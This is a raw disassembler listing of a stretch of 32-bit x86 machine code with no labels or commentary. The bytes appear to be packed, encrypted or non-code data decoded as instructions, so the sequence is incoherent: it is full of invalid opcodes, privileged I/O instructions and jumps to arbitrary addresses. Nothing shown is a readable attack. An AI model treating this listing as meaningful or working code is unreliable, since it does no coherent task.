  41e8c3:	dec    edi
  41e8c4:	daa    
  41e8c5:	retf   0x477
  41e8c8:	loope  0x41e89c
  41e8ca:	(bad)  
  41e8cb:	xor    dh,al
  41e8cd:	adc    esi,esp
  41e8cf:	sbb    BYTE PTR [edx-0x738c7a58],cl
  41e8d5:	(bad)  
  41e8d6:	pop    edx
  41e8d7:	push   ds
  41e8d8:	ss jnp 0x41e940
  41e8db:	in     al,0x3
  41e8dd:	test   BYTE PTR [ecx-0x26],0x3b
  41e8e1:	lea    esp,[edi-0x63]
  41e8e4:	cmp    al,0x83
  41e8e6:	(bad)  
  41e8e7:	sub    ebx,DWORD PTR [ebx]
  41e8e9:	pop    esp
  41e8ea:	mov    bl,0x8b
  41e8ec:	or     cl,BYTE PTR ds:[eax-0x56ad0b19]
  41e8f3:	jmp    0x41e92c
  41e8f5:	rol    bl,cl
  41e8f7:	inc    esi
  41e8f8:	call   0xb276:0x64ffdcce
  41e8ff:	data16 or al,0xcb
  41e902:	rol    DWORD PTR [edx-0x2139d8d5],1
  41e908:	sub    eax,0xf42ae064
  41e90d:	sahf   
  41e90e:	fidivr WORD PTR [eax-0x72]
  41e911:	pop    es
  41e912:	test   DWORD PTR [ebx+eax*2-0x16],esi
  41e916:	inc    eax
  41e917:	inc    edx
  41e918:	mov    cl,0x50
  41e91a:	popa   
  41e91b:	enter  0xc66c,0x7a
  41e91f:	inc    ebp
  41e920:	and    cl,ah
  41e922:	sub    edi,DWORD PTR [esi+0x5ca17e96]
  41e928:	mov    edi,0x740582d2
  41e92d:	shl    DWORD PTR [edi],1
  41e92f:	jge    0x41e9ab
  41e931:	leave  
  41e932:	(bad)  
  41e934:	pusha  
  41e935:	out    0x78,eax
  41e937:	fist   DWORD PTR [ebx*8-0xa5f0ce]
  41e93e:	(bad)  
  41e93f:	icebp  
  41e940:	ja     0x41e91c
  41e942:	add    DWORD PTR [ebx],esp
  41e944:	push   0x49
  41e946:	dec    edx
  41e947:	jle    0x41e949
  41e949:	inc    ebp
  41e94a:	add    DWORD PTR [edx+ebp*2+0xfd28262],ebx
  41e951:	mov    eax,0x46401750
  41e956:	jbe    0x41e8db
  41e958:	adc    eax,0x22f93114
  41e95d:	mov    WORD PTR [edi-0x16],es
  41e960:	nop
  41e961:	push   esp
  41e962:	xchg   DWORD PTR [ebp+0x7d],edi
  41e965:	les    edi,FWORD PTR [ebx+edx*2-0x5d]
  41e969:	bound  ecx,QWORD PTR [ebp+0x41b95b5c]
  41e96f:	and    eax,0x2c9ba1b2
  41e974:	inc    ebp
  41e975:	aad    0x48
  41e977:	xchg   ebx,eax
  41e978:	mov    DWORD PTR [edx],ebp
  41e97a:	xchg   esp,eax
  41e97b:	int    0x17
  41e97d:	pop    ebp
  41e97e:	into   
  41e97f:	adc    BYTE PTR [ecx+0xb],0xb7
  41e983:	sbb    ebp,edi
  41e985:	xchg   ecx,eax
  41e986:	inc    edi
  41e987:	int    0x24
  41e989:	aas    
  41e98a:	dec    edx
  41e98b:	push   esi
  41e98c:	out    0xbc,al
  41e98e:	in     al,dx
  41e98f:	add    BYTE PTR [esi],dl
  41e991:	cwde   
  41e992:	inc    ecx
  41e993:	lock or eax,0x7b211cc9
  41e999:	les    ebp,FWORD PTR [edx+edi*8-0x1f]
  41e99d:	pop    ss
  41e99e:	sahf   
  41e99f:	and    eax,0x6660f722
  41e9a4:	jecxz  0x41e957
  41e9a6:	xor    esp,DWORD PTR [ecx+ecx*8]
  41e9a9:	dec    esp
  41e9aa:	ja     0x41e9f1
  41e9ac:	pop    esp
  41e9ad:	hlt    
  41e9ae:	cmc    
  41e9af:	mov    cl,0xb4
  41e9b1:	push   es
  41e9b2:	or     ebp,DWORD PTR [ebx]
  41e9b4:	jge    0x41e9ce
  41e9b6:	cli    
  41e9b7:	or     BYTE PTR [edi+0x3495745c],bh
  41e9bd:	test   DWORD PTR ds:0xb12efafa,ebp
  41e9c3:	push   eax
  41e9c4:	pop    esi
  41e9c5:	data16 je 0x41e9bf
  41e9c8:	aaa    
  41e9c9:	in     eax,0x9
  41e9cb:	sahf   
  41e9cc:	(bad)  
  41e9cd:	lahf   
  41e9ce:	stos   BYTE PTR es:[edi],al
  41e9cf:	call   0x46c6:0x9345a5fb
  41e9d6:	adc    eax,0xe8f96db8
  41e9db:	sbb    al,0xe8
  41e9dd:	sbb    bh,al
  41e9df:	(bad)  
  41e9e0:	push   ss
  41e9e1:	test   esi,ebp
  41e9e3:	xchg   edx,eax
  41e9e4:	push   edi
  41e9e5:	(bad)  
  41e9e6:	call   0x5305704b
  41e9eb:	ds xchg esp,eax
  41e9ed:	mov    eax,0x12aaa80c
  41e9f2:	int    0x1c
  41e9f4:	shr    DWORD PTR [eax+0x7f8d458e],0x1f
  41e9fb:	push   ecx
  41e9fc:	mov    dl,0x30
  41e9fe:	pop    edx
  41e9ff:	adc    al,0x91
  41ea01:	mov    ebp,0x121e9110
  41ea06:	mov    esi,0xf6ac14ac
  41ea0b:	fbstp  TBYTE PTR ss:[edi-0x74]
  41ea0f:	sub    DWORD PTR [eax-0xf4a9b49],ebx
  41ea15:	inc    esp
  41ea16:	(bad)  
  41ea17:	out    0x3e,eax
  41ea19:	add    al,0x8c
  41ea1b:	dec    ebx
  41ea1c:	cli    
  41ea1d:	cmp    BYTE PTR [ebx-0x3f4119e9],ch
  41ea23:	fimul  DWORD PTR fs:[ebp+0x372a33f9]
  41ea2a:	push   ebx
  41ea2b:	push   edi
  41ea2c:	dec    ebx
  41ea2d:	imul   eax,DWORD PTR [edi-0x5445edb5],0x4c
  41ea34:	xchg   ecx,eax
  41ea35:	pop    esi
  41ea36:	xor    dh,BYTE PTR [ecx-0x15]
  41ea39:	inc    eax
  41ea3a:	sub    BYTE PTR [ecx],dl
  41ea3c:	les    ecx,FWORD PTR [edi+0x6]
  41ea3f:	outs   dx,BYTE PTR ds:[esi]
  41ea40:	dec    esp
  41ea41:	stos   DWORD PTR es:[edi],eax
  41ea42:	cwde   
  41ea43:	dec    edx
  41ea44:	icebp  
  41ea45:	adc    dh,al
  41ea47:	xor    al,0x8b
  41ea49:	sub    eax,0xf287e589
  41ea4e:	xchg   BYTE PTR [ebp-0xb],cl
  41ea51:	sub    eax,0xf1ad5de
  41ea56:	and    DWORD PTR [esi-0x3c],ecx
  41ea59:	shl    BYTE PTR [ebx],1
  41ea5b:	iret   
  41ea5c:	js     0x41ea6d
  41ea5e:	clc    
  41ea5f:	int    0xb
  41ea61:	dec    ecx
  41ea62:	aas    
  41ea63:	(bad)  
  41ea65:	push   ebp
  41ea66:	mov    ds:0x7443451f,al
  41ea6b:	or     eax,0x4efbbeb7
  41ea70:	xchg   bl,ch
  41ea72:	aad    0x8f
  41ea74:	inc    eax
  41ea75:	mov    esp,0xb35c6ac1
  41ea7a:	nop
  41ea7b:	repnz popa 
  41ea7d:	xchg   edi,eax
  41ea7e:	adc    BYTE PTR ds:[ecx+0x16],bl
  41ea82:	push   ecx
  41ea83:	ficom  WORD PTR [esp+edx*1+0x30]
  41ea87:	push   0x8a74979b
  41ea8c:	ins    DWORD PTR es:[edi],dx
  41ea8d:	add    DWORD PTR [ebx+0x14],0x17
  41ea91:	out    0x40,eax
  41ea93:	mov    edx,0x49e15a74
  41ea98:	call   0x9929:0xf80696de
  41ea9f:	popa   
  41eaa0:	shr    cl,0xf5
  41eaa3:	shr    ebx,1
  41eaa5:	into   
  41eaa6:	mov    edi,0xb8b3235e
  41eaab:	nop
  41eaac:	lods   al,BYTE PTR ds:[esi]
  41eaad:	inc    ebx
  41eaae:	(bad)  
  41eaaf:	hlt    
  41eab0:	aaa    
  41eab1:	mov    ah,0xf1
  41eab3:	xchg   edx,eax
  41eab4:	or     ebx,DWORD PTR [edx-0xa92f975]
  41eaba:	pop    ds
  41eabb:	aaa    
  41eabc:	minps  xmm0,xmm5
  41eabf:	out    0xf3,al
  41eac1:	enter  0x46ea,0x1d
  41eac5:	inc    DWORD PTR [edi+0x25]
  41eac8:	mov    DWORD PTR [edi+0x64a4acfd],edx
  41eace:	in     al,dx
  41eacf:	xchg   ebx,eax
  41ead0:	int3   
  41ead1:	xchg   ebx,eax
  41ead2:	imul   ebx,DWORD PTR [ecx],0xffffffb0
  41ead5:	sbb    eax,0x6b1257eb
  41eada:	cmp    cl,BYTE PTR [eax+0x14]
  41eadd:	pusha  
  41eade:	xor    al,0x5e
  41eae0:	mov    ebx,0xb1f2ec3f
  41eae5:	nop
  41eae6:	dec    edx
  41eae7:	xchg   ebp,ecx
  41eae9:	fisub  DWORD PTR [ebx]
  41eaeb:	cs cmp al,0xac
  41eaee:	sbb    esp,DWORD PTR [ecx-0x4e]
  41eaf1:	inc    edx
  41eaf2:	push   cx
  41eaf4:	out    dx,al
  41eaf5:	push   es
  41eaf6:	fidivr DWORD PTR [ecx-0x60f0b6d8]
  41eafc:	cmc    
  41eafd:	adc    ecx,esi
  41eaff:	sub    eax,0xf2f124b1
  41eb04:	or     al,0x10
  41eb06:	add    ebp,DWORD PTR [ecx]
  41eb08:	popf   
  41eb09:	shl    BYTE PTR [eax+0x635411cf],0xc6
  41eb10:	into   
  41eb11:	repz mov ds:0x412a6da2,al
  41eb17:	xchg   esp,esp
  41eb19:	inc    edi
  41eb1a:	in     eax,dx
  41eb1b:	mov    esi,ebp
  41eb1d:	add    edx,esp
  41eb1f:	inc    esi
  41eb20:	jne    0x41eae4
  41eb22:	out    0xe,eax
  41eb24:	cmovbe esp,DWORD PTR [edx+0x3e391c49]
  41eb2b:	fsubrp st(4),st
  41eb2d:	mov    ch,0xe4
  41eb2f:	dec    esp
  41eb30:	outs   dx,DWORD PTR ds:[esi]
  41eb31:	fld    TBYTE PTR [eax-0x18]
  41eb34:	xchg   ebp,eax
  41eb35:	les    edx,FWORD PTR ds:0x68d9bcc5
  41eb3b:	int3   
  41eb3c:	cmp    DWORD PTR [esi+0x53],ebp
  41eb3f:	add    esi,DWORD PTR [esi+eax*8]
  41eb42:	sub    al,0x77
  41eb44:	push   ebx
  41eb45:	sbb    BYTE PTR [esp+eax*1-0x9a7fd81],ah
  41eb4c:	mov    dl,0xdc
  41eb4e:	add    al,cl
  41eb50:	ror    BYTE PTR [ebp-0x5d43834a],0xf7
  41eb57:	stc    
  41eb58:	push   cs
  41eb59:	jno    0x41eb06
  41eb5b:	cmp    esp,DWORD PTR [ecx]
  41eb5d:	clc    
  41eb5e:	das    
  41eb5f:	xor    eax,0x2366b9cb
  41eb64:	sbb    dl,0x47
  41eb67:	or     DWORD PTR [edx+0x44],edi
  41eb6a:	out    0x82,eax
  41eb6c:	push   ds
  41eb6d:	mov    al,0xca
  41eb6f:	cwde   
  41eb70:	in     al,dx
  41eb71:	loop   0x41eb2a
  41eb73:	leave  
  41eb74:	rcl    BYTE PTR [edx+0xf],cl
  41eb77:	sahf   
  41eb78:	das    
  41eb79:	mov    al,0x6a
  41eb7b:	add    ecx,DWORD PTR [edx]
  41eb7d:	pop    ss
  41eb7e:	pop    es
  41eb7f:	enter  0x190f,0xf7
  41eb83:	ja     0x41ebdd
  41eb85:	or     al,0x34
  41eb87:	push   ebx
  41eb88:	(bad)  
  41eb89:	xchg   edi,eax
  41eb8a:	jnp    0x41ebe0
  41eb8c:	lods   al,BYTE PTR ds:[esi]
  41eb8d:	shl    DWORD PTR [ecx+0x1d],cl
  41eb90:	inc    BYTE PTR [eax-0x7d56a8a3]
  41eb96:	mov    ds:0xa0f78ba2,al
  41eb9b:	js     0x41ebc6
  41eb9d:	(bad)  
  41eb9e:	nop
  41eb9f:	fyl2x  
  41eba1:	dec    edi
  41eba2:	cli    
  41eba3:	jp     0x41eb68
  41eba5:	jl     0x41ebc3
  41eba7:	(bad)  [ecx+0x5f]
  41ebaa:	add    bl,BYTE PTR [esi-0x30743382]
  41ebb0:	mov    edx,0x3a3d2280
  41ebb5:	xor    DWORD PTR [eax-0x27575295],ebp
  41ebbb:	cmp    BYTE PTR [eax-0x575f4b4d],bh
  41ebc1:	in     al,dx
  41ebc2:	mov    ebx,0x4a630bbd
  41ebc7:	pop    ss
  41ebc8:	cmp    eax,0x352f048d
  41ebcd:	ret    
  41ebce:	mov    ds:0x7e9e02bd,al
  41ebd3:	retf   0x6fa3
  41ebd6:	pop    ebp
  41ebd7:	cmp    BYTE PTR [edx],0xec
  41ebda:	cld    
  41ebdb:	pop    ebx
  41ebdc:	sbb    DWORD PTR ds:0xafcfb251,ebp
  41ebe2:	ret    
  41ebe3:	(bad)  
  41ebe4:	mov    ebx,0x4afe4fb8
  41ebe9:	outs   dx,BYTE PTR ds:[esi]
  41ebea:	or     edi,0x14
  41ebed:	jge    0x41ec26
  41ebef:	out    dx,eax
  41ebf0:	cdq    
  41ebf1:	push   cs
  41ebf2:	repz dec edi
  41ebf4:	or     DWORD PTR [ebp-0x54255366],ecx
  41ebfa:	fucomip st,st(2)
  41ebfc:	aam    0x6f
  41ebfe:	fwait
  41ebff:	stc    
  41ec00:	ds mov ecx,0xb893f464
  41ec06:	aam    0x7b
  41ec08:	mov    cl,0xfd
  41ec0a:	sti    
  41ec0b:	pop    esp
  41ec0c:	add    esp,DWORD PTR [eax+0x4bb48e18]
  41ec12:	aad    0xf8
  41ec14:	push   es
  41ec15:	inc    esi
  41ec16:	leave  
  41ec17:	clc    
  41ec18:	aaa    
  41ec19:	pusha  
  41ec1a:	push   ds
  41ec1b:	pop    esi
  41ec1c:	mov    ebp,0x9d220167
  41ec21:	dec    ebx
  41ec22:	inc    ecx
  41ec23:	les    ebx,FWORD PTR ds:0x32c1b6e6
  41ec29:	xor    ah,BYTE PTR [ecx]
  41ec2b:	lock push 0xfffffff9
  41ec2e:	sbb    eax,0x24822fcd
  41ec33:	sub    al,0x3a
  41ec35:	add    eax,0x9d2aba43
  41ec3a:	push   ebx
  41ec3b:	add    DWORD PTR [edi+0x7d],eax
  41ec3e:	jp     0x41ec61
  41ec40:	xchg   ebx,eax
  41ec41:	sub    DWORD PTR [edx-0x4b605113],esp
  41ec47:	mov    eax,0xc1b1719c
  41ec4c:	inc    ecx
  41ec4d:	push   es
  41ec4e:	mov    ch,BYTE PTR [ecx+0x2f6c2a62]
  41ec54:	mov    ebx,0x4b55d4a
  41ec59:	ja     0x41ec4b
  41ec5b:	add    ch,al
  41ec5d:	xchg   edx,eax
  41ec5e:	mov    esp,DWORD PTR [ebx]
  41ec60:	pushf  
  41ec61:	mov    gs,WORD PTR [esi]
  41ec63:	in     eax,0x27
  41ec65:	mov    ebx,0x790a15c1
  41ec6a:	fmul   QWORD PTR [ebp+0x51]
  41ec6d:	js     0x41ec16
  41ec6f:	and    DWORD PTR ds:0x4426c93e,0x4a
  41ec76:	scas   eax,DWORD PTR es:[edi]
  41ec77:	xchg   esp,eax
  41ec78:	mov    ebx,DWORD PTR cs:[eax-0x37]
  41ec7c:	adc    DWORD PTR [eax-0x637cbb78],0xa9fab660
  41ec86:	sti    
  41ec87:	nop
  41ec88:	fs and esi,ecx
  41ec8b:	jb     0x41ec21
  41ec8d:	dec    esp
  41ec8e:	xor    ebp,ecx
  41ec90:	lds    ebx,FWORD PTR [edi]
  41ec92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec93:	scas   al,BYTE PTR es:[edi]
  41ec94:	dec    edx
  41ec95:	xchg   ebp,eax
  41ec96:	sbb    BYTE PTR [eax],bh
  41ec98:	imul   ax,WORD PTR [esi+ebx*1-0x28de236f],0xfff0
  41eca1:	sbb    dl,BYTE PTR [edx]
  41eca3:	repnz mov fs:0x2c98f2ba,al
  41ecaa:	add    ah,cl
  41ecac:	mov    dh,0x3e
  41ecae:	adc    DWORD PTR [ebp-0x1a],0x6f50a3cf
  41ecb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecb6:	jmp    0x41ec6b
  41ecb8:	mov    al,0xfb
  41ecba:	dec    esi
  41ecbb:	cmp    eax,DWORD PTR [esi+0x7]
  41ecbe:	ss cs aaa 
  41ecc1:	lods   al,BYTE PTR ds:[esi]
  41ecc2:	or     ecx,ebp
  41ecc4:	jbe    0x41ed03
  41ecc6:	push   ebx
  41ecc7:	pop    ebx
  41ecc8:	mov    cl,0x47
  41ecca:	or     ch,ch
  41eccc:	jbe    0x41ecaf
  41ecce:	and    esi,ebx
  41ecd0:	in     al,dx
  41ecd1:	test   al,0xd7
  41ecd3:	call   0x80cf:0x31d81586
  41ecda:	test   al,0x87
  41ecdc:	fiadd  DWORD PTR [edi+0x71]
  41ecdf:	std    
  41ece0:	sbb    eax,0xeae95f89
  41ece5:	inc    ecx
  41ece6:	jle    0x41ecf9
  41ece8:	push   edx
  41ece9:	jbe    0x41ed67
  41eceb:	mov    ch,BYTE PTR [esi-0x3c59d249]
  41ecf1:	mov    edi,0x37059ee7
  41ecf6:	xchg   esp,eax
  41ecf7:	bound  ebp,QWORD PTR [edi+ebp*2]
  41ecfa:	enter  0xa5e1,0xff
  41ecfe:	mov    DWORD PTR [edi],ecx
  41ed00:	ror    BYTE PTR [esi-0x189ba4a7],cl
  41ed06:	xchg   ebx,eax
  41ed07:	jg     0x41ed79
  41ed09:	sbb    BYTE PTR [ecx-0x423e7c5e],cl
  41ed0f:	cwde   
  41ed10:	mov    ebp,0x5ed72c4b
  41ed15:	outs   dx,DWORD PTR ds:[esi]
  41ed16:	cli    
  41ed17:	dec    esi
  41ed18:	ds and esp,edx
  41ed1b:	push   eax
  41ed1c:	(bad)  
  41ed1e:	rcr    al,0x77
  41ed21:	cmp    dl,BYTE PTR [eax+0x33]
  41ed24:	cld    
  41ed25:	xchg   esi,eax
  41ed26:	push   ds
  41ed27:	ficomp WORD PTR [esi+0x2277497c]
  41ed2d:	sbb    BYTE PTR [edx],ch
  41ed2f:	ds dec ecx
  41ed31:	dec    esi
  41ed32:	mov    cl,0xfd
  41ed34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed35:	cmp    al,bl
  41ed37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed38:	push   0x48
  41ed3a:	nop
  41ed3b:	cli    
  41ed3c:	add    dh,ah
  41ed3e:	into   
  41ed3f:	dec    edx
  41ed40:	repz push edi
  41ed42:	cmc    
  41ed43:	dec    edi
  41ed44:	mov    fs,ebp
  41ed46:	loop   0x41edaa
  41ed48:	enter  0xb587,0xc
  41ed4c:	fucomip st,st(4)
  41ed4e:	xchg   esi,eax
  41ed4f:	out    dx,al
  41ed50:	mov    bh,0x94
  41ed52:	pusha  
  41ed53:	inc    esp
  41ed54:	xor    al,0xad
  41ed56:	and    DWORD PTR [esp+esi*4],0x24170f0b
  41ed5d:	shl    edi,0x5c
  41ed60:	xor    bl,dh
  41ed62:	xchg   edi,eax
  41ed63:	(bad)  
  41ed64:	push   0xffffffd5
  41ed66:	js     0x41edb1
  41ed68:	repnz mov al,ds:0x5631d347
  41ed6e:	das    
  41ed6f:	cld    
  41ed70:	push   eax
  41ed71:	or     DWORD PTR [eax+0x47],ebp
  41ed74:	push   es
  41ed75:	adc    edx,edi
  41ed77:	sbb    cl,BYTE PTR [ecx-0x23]
  41ed7a:	dec    esp
  41ed7b:	adc    DWORD PTR [edx+0x5e],ecx
  41ed7e:	in     al,dx
  41ed7f:	test   DWORD PTR [edx+ebp*4],ecx
  41ed82:	sub    edx,edi
  41ed84:	psrlq  mm3,QWORD PTR [edi-0x2946173]
  41ed8b:	out    dx,eax
  41ed8c:	inc    ecx
  41ed8d:	jmp    0xc63c675f
  41ed92:	in     al,0x36
  41ed94:	pop    ss
  41ed95:	add    eax,0x9e780905
  41ed9a:	jle    0x41eddf
  41ed9c:	sbb    eax,0x18b44986
  41eda1:	int    0xde
  41eda3:	dec    edi
  41eda4:	lock rcr BYTE PTR es:[edx+ebp*4+0x6],cl
  41edaa:	add    eax,0xfe61845f
  41edaf:	clc    
  41edb0:	test   al,0x56
  41edb2:	mov    BYTE PTR [edi],al
  41edb4:	scas   al,BYTE PTR es:[edi]
  41edb5:	call   0x98a1:0x92d6a810
  41edbc:	sub    edi,DWORD PTR [edx+0x7c]
  41edbf:	sti    
  41edc0:	clc    
  41edc1:	rcr    DWORD PTR [edi*4-0x5d537b8b],1
  41edc8:	in     al,dx
  41edc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edca:	mov    edx,0x9335eb72
  41edcf:	arpl   WORD PTR [eax+0x76],ax
  41edd2:	xor    esi,ebx
  41edd4:	add    al,0x86
  41edd6:	jl     0x41ee05
  41edd8:	pusha  
  41edd9:	sub    eax,DWORD PTR [ecx-0x7709fbad]
  41eddf:	xchg   edx,eax
  41ede0:	or     ebp,DWORD PTR [eax+0x4b]
  41ede3:	jnp    0x41eda8
  41ede5:	shl    dl,0x65
  41ede8:	inc    ebp
  41ede9:	or     BYTE PTR [ebx+0x6bd162b4],0xd9
  41edf0:	push   es
  41edf1:	adc    al,0xd1
  41edf3:	xor    DWORD PTR [ebx+0x52bc9678],esp
  41edf9:	push   0xffffffc4
  41edfb:	cmp    al,0x3a
  41edfd:	and    DWORD PTR [esi-0x21f7ca89],0x87beef52
  41ee07:	xchg   esi,eax
  41ee08:	aam    0x5b
  41ee0a:	pop    ds
  41ee0b:	sti    
  41ee0c:	add    eax,0x6a49e870
  41ee11:	(bad)  
  41ee12:	iret   
  41ee13:	jbe    0x41edb0
  41ee15:	mov    ebx,0x76dceb7a
  41ee1a:	mov    eax,0x7df61413
  41ee1f:	fnsave [ebx+0x36]
  41ee22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee23:	push   es
  41ee24:	dec    esi
  41ee25:	(bad)  
  41ee26:	xor    eax,0x73a5e4f0
  41ee2b:	das    
  41ee2c:	inc    edx
  41ee2d:	fnstcw WORD PTR [ebx]
  41ee2f:	mov    ebp,0x4721878e
  41ee34:	je     0x41ee7b
  41ee36:	mov    eax,0x5a8e6180
  41ee3b:	sub    al,0x57
  41ee3d:	mov    al,0x1d
  41ee3f:	jge    0x41ee6a
  41ee41:	sar    edi,0xa4
  41ee44:	sar    DWORD PTR [esi+0x16],1
  41ee47:	mov    edi,0xfde29ab
  41ee4c:	mov    al,0x20
  41ee4e:	(bad)  
  41ee4f:	repz mov edi,0x56a81416
  41ee55:	or     DWORD PTR [ecx-0x6eeff0b0],ecx
  41ee5b:	mov    eax,0x13e4e2a6
  41ee60:	(bad)
  41ee63:	jne    0x41ee57
  41ee65:	test   eax,0x3eab3681
  41ee6a:	je     0x41eea9
  41ee6c:	stos   DWORD PTR es:[edi],eax
  41ee6d:	or     al,cl
  41ee6f:	call   0xe3c8e24b
  41ee74:	mov    ecx,0xac148014
  41ee79:	stos   DWORD PTR es:[edi],eax
  41ee7a:	push   ebp
  41ee7b:	cs in  eax,dx
  41ee7d:	lods   eax,DWORD PTR ds:[esi]
  41ee7e:	rcr    BYTE PTR [esi+ebp*1-0x13],0x3f
  41ee83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee84:	nop
  41ee85:	jo     0x41eea0
  41ee87:	loopne 0x41ef02
  41ee89:	or     eax,0xecb479bf
  41ee8e:	jmp    0x718:0x436be882
  41ee95:	sub    al,0x35
  41ee97:	push   ss
  41ee98:	mov    ch,0xa4
  41ee9a:	loopne 0x41ee6e
  41ee9c:	add    BYTE PTR [eax+0x4f],ch
  41ee9f:	shr    DWORD PTR [ecx-0x2a5ae333],0x69
  41eea6:	mov    dh,0x79
  41eea8:	mov    eax,0x45ba07cf
  41eead:	sbb    eax,0x18a3ed85
  41eeb2:	retf   0x9ea6
  41eeb5:	imul   ebx,edi,0x63
  41eeb8:	outs   dx,DWORD PTR ds:[esi]
  41eeb9:	ret    
  41eeba:	xchg   edx,eax
  41eebb:	pop    ss
  41eebc:	cmp    dh,bh
  41eebe:	mov    ds:0x9df0f22d,al
  41eec3:	bound  ebx,QWORD PTR [ebx]
  41eec5:	xlat   BYTE PTR ds:[ebx]
  41eec6:	into   
  41eec7:	xchg   esp,eax
  41eec8:	ror    BYTE PTR [ecx+0x14],cl
  41eecb:	push   esi
  41eecc:	adc    eax,0xe984592d
  41eed1:	shl    DWORD PTR [ecx+ebp*2-0x68],cl
  41eed5:	dec    esi
  41eed6:	repnz ss add al,0x95
  41eeda:	mov    edx,0x871f7fa
  41eedf:	dec    eax
  41eee0:	js     0x41ef2a
  41eee2:	xor    al,0xf2
  41eee4:	shl    BYTE PTR [esi+0x69],0x4a
  41eee8:	sub    DWORD PTR [edx+0x77b5d802],0x48
  41eeef:	and    al,0xe0
  41eef1:	jge    0x41ef21
  41eef3:	add    al,0xe4
  41eef5:	sbb    bl,ah
  41eef7:	ins    BYTE PTR es:[edi],dx
  41eef8:	dec    ecx
  41eef9:	test   al,0xc7
  41eefc:	or     al,0x91
  41eefe:	push   ss
  41eeff:	in     al,0xa
  41ef01:	cmp    eax,0x1257673d
  41ef06:	mov    BYTE PTR [ecx-0x7b],bl
  41ef09:	shr    eax,1
  41ef0b:	mov    dh,0xd0
  41ef0d:	popf   
  41ef0e:	jle    0x41ef48
  41ef10:	xor    esi,edi
  41ef12:	loop   0x41ef00
  41ef14:	mov    bh,0xe4
  41ef16:	ss loopne 0x41ef70
  41ef19:	ret    
  41ef1a:	addr16 mov dh,0x3
  41ef1d:	mov    cl,0xd5
  41ef1f:	stos   DWORD PTR es:[edi],eax
  41ef20:	scas   al,BYTE PTR es:[edi]
  41ef21:	ds add eax,0x1acb467c
  41ef27:	push   eax
  41ef28:	inc    edx
  41ef29:	push   ecx
  41ef2a:	out    0xe0,eax
  41ef2c:	dec    esp
  41ef2d:	imul   eax,DWORD PTR [ebx-0x2c],0x76fd9166
  41ef34:	jmp    0x542:0xb1ac45ff
  41ef3b:	mov    bh,0xf5
  41ef3d:	jmp    0x84888bb7
  41ef42:	aas    
  41ef43:	xchg   BYTE PTR [edi+0x6a],cl
  41ef46:	ja     0x41ef31
  41ef48:	xor    edx,esi
  41ef4a:	adc    cl,BYTE PTR [eax]
  41ef4c:	fstp   TBYTE PTR [ebp+ebp*1+0x30e47c15]
  41ef53:	sbb    edx,DWORD PTR [edi]
  41ef55:	jp     0x41efd3
  41ef57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef58:	(bad)
  41ef5c:	mov    eax,ds:0xdcadaa33
  41ef61:	pop    esi
  41ef62:	imul   ecx,DWORD PTR [ecx+ecx*8],0x68
  41ef66:	sets   BYTE PTR [ebx]
  41ef69:	xchg   dl,al
  41ef6b:	sub    al,0xc8
  41ef6d:	in     eax,dx
  41ef6e:	test   DWORD PTR [esi],edi
  41ef70:	inc    ebp
  41ef71:	bound  esp,QWORD PTR [eax]
  41ef73:	imul   esp,edx,0x6a65ca85
  41ef79:	mov    ecx,edi
  41ef7b:	sbb    bh,0xb3
  41ef7e:	pop    ebx
  41ef7f:	dec    eax
  41ef80:	ds cld 
  41ef82:	jmp    0x41ef04
  41ef84:	jg     0x41efa6
  41ef86:	dec    edi
  41ef87:	adc    eax,0x2dc806d3
  41ef8c:	ret    0x7897
  41ef8f:	pop    ss
  41ef90:	or     eax,0x6b276ac3
  41ef95:	sti    
  41ef96:	adc    eax,0x6322e248
  41ef9b:	int    0x19
  41ef9d:	fwait
  41ef9e:	add    eax,0xfd976e25
  41efa3:	inc    edi
  41efa4:	dec    esp
  41efa5:	ret    
  41efa6:	pushf  
  41efa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efa8:	xchg   BYTE PTR [edi+edx*4-0x2f],ah
  41efac:	jmp    0xed3df9f4
  41efb1:	aam    0x36
  41efb3:	xor    BYTE PTR [ebp-0x28],0xc5
  41efb7:	bound  ebp,QWORD PTR ds:0xb5c84899
  41efbd:	out    dx,eax
  41efbe:	ficom  DWORD PTR [edx]
  41efc0:	aaa    
  41efc1:	push   ebp
  41efc2:	xor    al,BYTE PTR [edi]
  41efc4:	shl    DWORD PTR [esi],1
  41efc6:	mov    al,ds:0x3f9ca793
  41efcb:	bound  ebx,QWORD PTR [ebx+edi*1+0x4a1f3b4e]
  41efd2:	leave  
  41efd3:	cwde   
  41efd4:	mov    ecx,0xe379cade
  41efd9:	pushf  
  41efda:	cwde   
  41efdb:	push   edi
  41efdc:	retf   0xb574
  41efdf:	mov    edx,0xae0a5b6d
  41efe4:	dec    esp
  41efe5:	xchg   esp,eax
  41efe6:	daa    
  41efe7:	mov    DWORD PTR [eax+ecx*1],edx
  41efea:	jmp    0x8d6e:0xceee87c2
  41eff1:	xor    esi,eax
  41eff3:	pop    eax
  41eff4:	popf   
  41eff5:	push   edx
  41eff6:	std    
  41eff7:	pop    ecx
  41eff8:	ret    0x6a67
  41effb:	push   esi
  41effc:	mov    edx,0x86a6a529
  41f001:	stos   BYTE PTR es:[edi],al
  41f002:	push   esi
  41f003:	lea    ebx,[edi-0x2a]
  41f006:	arpl   WORD PTR [edx+0x76],sp
  41f009:	dec    eax
  41f00a:	jecxz  0x41ef95
  41f00c:	add    BYTE PTR [ebp+eax*8-0x66],bl
  41f010:	sub    al,0x7d
  41f012:	pop    ecx
  41f013:	stc    
  41f014:	mov    edi,0xe1742902
  41f019:	sbb    BYTE PTR [edx],dh
  41f01b:	scas   eax,DWORD PTR es:[edi]
  41f01c:	addr16 jbe 0x41f074
  41f01f:	or     edx,edi
  41f021:	dec    esp
  41f022:	inc    esi
  41f023:	mov    cl,0x6d
  41f025:	xchg   edi,eax
  41f026:	jnp    0x41efb9
  41f028:	lock pop esi
  41f02a:	cli    
  41f02b:	outs   dx,DWORD PTR ds:[esi]
  41f02c:	fnstenv [esi]
  41f02e:	enter  0x304e,0xf1
  41f032:	cld    
  41f033:	pop    ebx
  41f034:	add    BYTE PTR [esi+0x6a],dh
  41f037:	inc    ebp
